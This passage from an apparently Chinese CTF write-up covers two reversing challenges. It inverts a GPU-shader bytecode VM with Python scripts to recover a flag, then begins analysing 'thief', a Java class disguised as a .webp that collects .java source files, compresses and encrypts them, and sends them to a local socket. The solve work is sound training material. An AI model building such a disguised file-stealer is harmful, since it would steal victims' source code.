</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>mad</span><span class=w> </span><span class=n>r1</span><span class=p>.</span><span class=na>yz</span><span class=p>,</span><span class=w> </span><span class=n>cb0</span><span class=o>[</span><span class=n>0</span><span class=o>]</span><span class=p>.</span><span class=na>xxyx</span><span class=p>,</span><span class=w> </span><span class=n>cb0</span><span class=o>[</span><span class=n>1</span><span class=o>]</span><span class=p>.</span><span class=na>yyyy</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>yyzy</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nf>sample_l_indexable</span><span class=p>(</span><span class=n>texture2d</span><span class=p>)(</span><span class=kt>float</span><span class=p>,</span><span class=kt>float</span><span class=p>,</span><span class=kt>float</span><span class=p>,</span><span class=kt>float</span><span class=p>)</span><span class=w> </span><span class=n>r2</span><span class=p>.</span><span class=na>xyzw</span><span class=p>,</span><span class=w> </span><span class=n>r1</span><span class=p>.</span><span class=na>yzyy</span><span class=p>,</span><span class=w> </span><span class=n>t0</span><span class=p>.</span><span class=na>xyzw</span><span class=p>,</span><span class=w> </span><span class=n>s0</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>else</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>mov</span><span class=w> </span><span class=n>r2</span><span class=p>.</span><span class=na>xyzw</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>,</span><span class=n>0</span><span class=p>,</span><span class=n>0</span><span class=p>,</span><span class=n>1</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>endif</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>if_nz</span><span class=w> </span><span class=n>r1</span><span class=p>.</span><span class=na>x</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>mad</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>yz</span><span class=p>,</span><span class=w> </span><span class=o>-</span><span class=n>cb0</span><span class=o>[</span><span class=n>0</span><span class=o>]</span><span class=p>.</span><span class=na>xxyx</span><span class=p>,</span><span class=w> </span><span class=n>cb0</span><span class=o>[</span><span class=n>1</span><span class=o>]</span><span class=p>.</span><span class=na>yyyy</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>yyzy</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nf>sample_l_indexable</span><span class=p>(</span><span class=n>texture2d</span><span class=p>)(</span><span class=kt>float</span><span class=p>,</span><span class=kt>float</span><span class=p>,</span><span class=kt>float</span><span class=p>,</span><span class=kt>float</span><span class=p>)</span><span class=w> </span><span class=n>r2</span><span class=p>.</span><span class=na>xyzw</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>yzyy</span><span class=p>,</span><span class=w> </span><span class=n>t1</span><span class=p>.</span><span class=na>xyzw</span><span class=p>,</span><span class=w> </span><span class=n>s0</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>endif</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>add</span><span class=w> </span><span class=n>r1</span><span class=p>.</span><span class=na>xyzw</span><span class=p>,</span><span class=w> </span><span class=o>-</span><span class=n>r2</span><span class=p>.</span><span class=na>xyzw</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>,</span><span class=w> </span><span class=n>1</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mad</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>xyzw</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>xxxx</span><span class=p>,</span><span class=w> </span><span class=n>r1</span><span class=p>.</span><span class=na>xyzw</span><span class=p>,</span><span class=w> </span><span class=n>r2</span><span class=p>.</span><span class=na>xyzw</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>store_uav_typed</span><span class=w> </span><span class=n>u0</span><span class=p>.</span><span class=na>xyzw</span><span class=p>,</span><span class=w> </span><span class=n>vThreadID</span><span class=p>.</span><span class=na>xyyy</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>xyzw</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>ret</span><span class=w> 
</span></span></span></code></pre></td></tr></table></div></div><p>K0：单线程解释执行 coTex里的 RGBA 字节码维护 mem[32] 和 reg[16]，按 opcode 做立即数赋值、从 WorkTex(u0) 读字节、XOR、8-bit 循环移位、乘法/加法混淆、比较设条件与条件跳转；执行结束后把 reg[0..15] 归一化为 float 写回 WorkTex 的 16×1 像素。</p><p>K1：每个线程处理一个 i（0..15）：从 WorkTex(u0) 读 work[i]（red*255 取整 &amp;255），计算 ((work[i] + i) & 0xFF)，再从 ciTex(t0) 读 ci[i]（同样取整 &amp;255），若 ci[i] != ((work[i] + i) & 0xFF) 就把 SharedState[0]（u1[0]）写成 1 表示失败；等价通过条件是 work[i] = (ci[i] - i) & 0xFF。</p><p>K2：典型 tile 渲染/后处理：对输出纹理 u0 的每个像素做边界检查后，按常量缓冲 CB0 计算归一化坐标并做 sincos 旋转/缩放偏移；根据 SharedState[0]（u1[0]）选择采样 t0（状态=0）或 t1（状态=1，否则输出黑），再按 r0.x 做一次向黑/alpha=1 的线性淡出混合，最后写回 u0</p><p>VM字节码和比较值来自于coTex.png和ciTex.png，写脚本提取出来：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>PIL</span> <span class=kn>import</span> <span class=n>Image</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>img</span> <span class=o>=</span> <span class=n>Image</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=s2>&#34;ciTex.png&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>convert</span><span class=p>(</span><span class=s2>&#34;RGBA&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>w</span><span class=p>,</span> <span class=n>h</span> <span class=o>=</span> <span class=n>img</span><span class=o>.</span><span class=n>size</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>px</span> <span class=o>=</span> <span class=n>img</span><span class=o>.</span><span class=n>load</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>ci</span> <span class=o>=</span> <span class=p>[</span><span class=n>px</span><span class=p>[</span><span class=n>x</span><span class=p>,</span> <span class=mi>0</span><span class=p>][</span><span class=mi>0</span><span class=p>]</span> <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>w</span><span class=p>)]</span>  
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>ci</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>t</span> <span class=o>=</span> <span class=p>[(</span><span class=n>ci</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>-</span> <span class=n>i</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xFF</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>ci</span><span class=p>))]</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;target :&#34;</span><span class=p>,</span> <span class=n>t</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>PIL</span> <span class=kn>import</span> <span class=n>Image</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>img</span> <span class=o>=</span> <span class=n>Image</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=s2>&#34;coTex.png&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>convert</span><span class=p>(</span><span class=s2>&#34;RGBA&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>w</span><span class=p>,</span> <span class=n>h</span> <span class=o>=</span> <span class=n>img</span><span class=o>.</span><span class=n>size</span>
</span></span><span class=line><span class=cl><span class=k>assert</span> <span class=n>h</span> <span class=o>==</span> <span class=mi>1</span><span class=p>,</span> <span class=sa>f</span><span class=s2>&#34;expected 1xH image, got </span><span class=si>{</span><span class=n>w</span><span class=si>}</span><span class=s2>x</span><span class=si>{</span><span class=n>h</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>rgba</span> <span class=o>=</span> <span class=p>[</span><span class=n>img</span><span class=o>.</span><span class=n>getpixel</span><span class=p>((</span><span class=n>x</span><span class=p>,</span> <span class=mi>0</span><span class=p>))</span> <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>w</span><span class=p>)]</span>  
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>rgba</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>得到：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Rust data-lang=Rust><span class=line><span class=cl><span class=n>ci</span>: <span class=p>[</span><span class=mi>233</span><span class=p>,</span><span class=w> </span><span class=mi>142</span><span class=p>,</span><span class=w> </span><span class=mi>138</span><span class=p>,</span><span class=w> </span><span class=mi>138</span><span class=p>,</span><span class=w> </span><span class=mi>183</span><span class=p>,</span><span class=w> </span><span class=mi>231</span><span class=p>,</span><span class=w> </span><span class=mi>201</span><span class=p>,</span><span class=w> </span><span class=mi>224</span><span class=p>,</span><span class=w> </span><span class=mi>184</span><span class=p>,</span><span class=w> </span><span class=mi>151</span><span class=p>,</span><span class=w> </span><span class=mi>183</span><span class=p>,</span><span class=w> </span><span class=mi>75</span><span class=p>,</span><span class=w> </span><span class=mi>59</span><span class=p>,</span><span class=w> </span><span class=mi>33</span><span class=p>,</span><span class=w> </span><span class=mi>211</span><span class=p>,</span><span class=w> </span><span class=mi>124</span><span class=p>]</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>target</span><span class=w> </span>: <span class=p>[</span><span class=mi>233</span><span class=p>,</span><span class=w> </span><span class=mi>141</span><span class=p>,</span><span class=w> </span><span class=mi>136</span><span class=p>,</span><span class=w> </span><span class=mi>135</span><span class=p>,</span><span class=w> </span><span class=mi>179</span><span class=p>,</span><span class=w> </span><span class=mi>226</span><span class=p>,</span><span class=w> </span><span class=mi>195</span><span class=p>,</span><span class=w> </span><span class=mi>217</span><span class=p>,</span><span class=w> </span><span class=mi>176</span><span class=p>,</span><span class=w> </span><span class=mi>142</span><span class=p>,</span><span class=w> </span><span class=mi>173</span><span class=p>,</span><span class=w> </span><span class=mi>64</span><span class=p>,</span><span class=w> </span><span class=mi>47</span><span class=p>,</span><span class=w> </span><span class=mi>20</span><span class=p>,</span><span class=w> </span><span class=mi>197</span><span class=p>,</span><span class=w> </span><span class=mi>109</span><span class=p>]</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>[(</span><span class=mi>0</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=w> </span><span class=mi>42</span><span class=p>),</span><span class=w> </span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=w> </span><span class=mi>2</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>),</span><span class=w> </span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=w> </span><span class=mi>2</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>),</span><span class=w> </span><span class=p>(</span><span class=mi>2</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>),</span><span class=w> </span><span class=p>(</span><span class=mi>3</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=w> </span><span class=mi>2</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>),</span><span class=w> </span><span class=p>(</span><span class=mi>4</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=w> </span><span class=mi>7</span><span class=p>),</span><span class=w> </span><span class=p>(</span><span class=mi>6</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=w> </span><span class=mi>2</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>),</span><span class=w> </span><span class=p>(</span><span class=mi>7</span><span class=p>,</span><span class=w> </span><span class=mi>2</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>),</span><span class=w> </span><span class=p>(</span><span class=mi>6</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>),</span><span class=w> </span><span class=p>(</span><span class=mi>5</span><span class=p>,</span><span class=w> </span><span class=mi>2</span><span class=p>,</span><span class=w> </span><span class=mi>2</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>),</span><span class=w> </span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=w> </span><span class=mi>2</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=w> </span><span class=mi>16</span><span class=p>),</span><span class=w> </span><span class=p>(</span><span class=mi>9</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=w> </span><span class=mi>247</span><span class=p>),</span><span class=w> </span><span class=p>(</span><span class=mi>10</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>)]</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>VM字节码梳理过后是如下逻辑：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Rust data-lang=Rust><span class=line><span class=cl><span class=err>初始</span><span class=w> </span><span class=n>state</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>42</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=err>对每个</span><span class=w> </span><span class=n>i</span><span class=err>：</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>v</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>inp</span><span class=p>[</span><span class=n>i</span><span class=p>]</span><span class=w> </span><span class=o>^</span><span class=w> </span><span class=n>state</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>v</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>rol8</span><span class=p>(</span><span class=n>v</span><span class=p>,</span><span class=w> </span><span class=n>i</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>v</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>v</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=mi>7</span><span class=p>)</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=mh>0xFF</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>v</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>v</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>i</span><span class=p>)</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=mh>0xFF</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>out</span><span class=p>[</span><span class=n>i</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>v</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>state</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>state</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>out</span><span class=p>[</span><span class=n>i</span><span class=p>])</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=mh>0xFF</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>7 mod 256 可逆，逆元为183，写逆为：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Rust data-lang=Rust><span class=line><span class=cl><span class=err>初始</span><span class=w> </span><span class=n>state</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>42</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=err>对每个</span><span class=w> </span><span class=n>i</span><span class=err>，已知</span><span class=w> </span><span class=n>out</span><span class=p>[</span><span class=n>i</span><span class=p>]</span><span class=o>=</span><span class=n>o</span><span class=err>：</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>w</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>o</span><span class=w> </span><span class=o>-</span><span class=w> </span><span class=n>i</span><span class=p>)</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=mh>0xFF</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>u</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>w</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=mi>183</span><span class=p>)</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=mh>0xFF</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>v</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>ror8</span><span class=p>(</span><span class=n>u</span><span class=p>,</span><span class=w> </span><span class=n>i</span><span class=p>)</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>inp</span><span class=p>[</span><span class=n>i</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>v</span><span class=w> </span><span class=o>^</span><span class=w> </span><span class=n>state</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>state</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>state</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>o</span><span class=p>)</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=mh>0xFF</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>连续逆三轮即可，exp如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=k>def</span> <span class=nf>rol8</span><span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=n>s</span><span class=p>):</span> <span class=n>s</span> <span class=o>&amp;=</span> <span class=mi>7</span><span class=p>;</span> <span class=k>return</span> <span class=p>((</span><span class=n>x</span> <span class=o>&lt;&lt;</span> <span class=n>s</span><span class=p>)</span> <span class=o>|</span> <span class=p>(</span><span class=n>x</span> <span class=o>&gt;&gt;</span> <span class=p>(</span><span class=mi>8</span> <span class=o>-</span> <span class=n>s</span><span class=p>)))</span> <span class=o>&amp;</span> <span class=mh>0xFF</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>ror8</span><span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=n>s</span><span class=p>):</span> <span class=n>s</span> <span class=o>&amp;=</span> <span class=mi>7</span><span class=p>;</span> <span class=k>return</span> <span class=p>((</span><span class=n>x</span> <span class=o>&gt;&gt;</span> <span class=n>s</span><span class=p>)</span> <span class=o>|</span> <span class=p>(</span><span class=n>x</span> <span class=o>&lt;&lt;</span> <span class=p>(</span><span class=mi>8</span> <span class=o>-</span> <span class=n>s</span><span class=p>)))</span> <span class=o>&amp;</span> <span class=mh>0xFF</span>
</span></span><span class=line><span class=cl><span class=n>INV7</span> <span class=o>=</span> <span class=mi>183</span>  
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>Finv</span><span class=p>(</span><span class=n>out</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>state</span> <span class=o>=</span> <span class=mi>42</span>
</span></span><span class=line><span class=cl>    <span class=n>inp</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span><span class=p>,</span> <span class=n>o</span> <span class=ow>in</span> <span class=nb>enumerate</span><span class=p>(</span><span class=n>out</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>w</span> <span class=o>=</span> <span class=p>(</span><span class=n>o</span> <span class=o>-</span> <span class=n>i</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xFF</span>
</span></span><span class=line><span class=cl>        <span class=n>u</span> <span class=o>=</span> <span class=p>(</span><span class=n>w</span> <span class=o>*</span> <span class=n>INV7</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xFF</span>
</span></span><span class=line><span class=cl>        <span class=n>v</span> <span class=o>=</span> <span class=n>ror8</span><span class=p>(</span><span class=n>u</span><span class=p>,</span> <span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>inp</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>v</span> <span class=o>^</span> <span class=n>state</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>state</span> <span class=o>=</span> <span class=p>(</span><span class=n>state</span> <span class=o>+</span> <span class=n>o</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xFF</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>inp</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>ci</span> <span class=o>=</span> <span class=p>[</span><span class=mi>233</span><span class=p>,</span><span class=mi>142</span><span class=p>,</span><span class=mi>138</span><span class=p>,</span><span class=mi>138</span><span class=p>,</span><span class=mi>183</span><span class=p>,</span><span class=mi>231</span><span class=p>,</span><span class=mi>201</span><span class=p>,</span><span class=mi>224</span><span class=p>,</span><span class=mi>184</span><span class=p>,</span><span class=mi>151</span><span class=p>,</span><span class=mi>183</span><span class=p>,</span><span class=mi>75</span><span class=p>,</span><span class=mi>59</span><span class=p>,</span><span class=mi>33</span><span class=p>,</span><span class=mi>211</span><span class=p>,</span><span class=mi>124</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>t</span>  <span class=o>=</span> <span class=p>[(</span><span class=n>ci</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>-</span> <span class=n>i</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xFF</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>16</span><span class=p>)]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>x</span> <span class=o>=</span> <span class=n>t</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>3</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>x</span> <span class=o>=</span> <span class=n>Finv</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=nb>bytes</span><span class=p>(</span><span class=n>x</span><span class=p>)</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;ascii&#39;</span><span class=p>))</span> 
</span></span></code></pre></td></tr></table></div></div><p>flag为：<code>alictf{5haderVM_Rep3at!}</code></p><h2 id=thief>thief</h2><p>unkown.zip里藏的.webp魔数是cafebabe，实际上是.class文件</p><p>梳理逻辑，整体逻辑如下：</p><p>在某个根目录（user.dir 的 parent）下递归搜集最多 9 个 .java 文件</p><p>每 3 个文件为一批，然后进行如下操作：</p><ol><li>读取文件内容</li><li>用自定义 LZRR 压缩（每个文件独立压缩块）</li><li>拼接所有块</li><li>生成随机 8 字节会话 key，并把它用 RSA(65537) 公钥加密写进包头</li><li>用 Runner.encrypt(algo2/3, data, key) 对 payload 加密/混淆</li><li>将结果通过 Socket 发往 127.0.0.1:8889</li></ol><p>那么首先从流量包里解析3 个 batch payload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
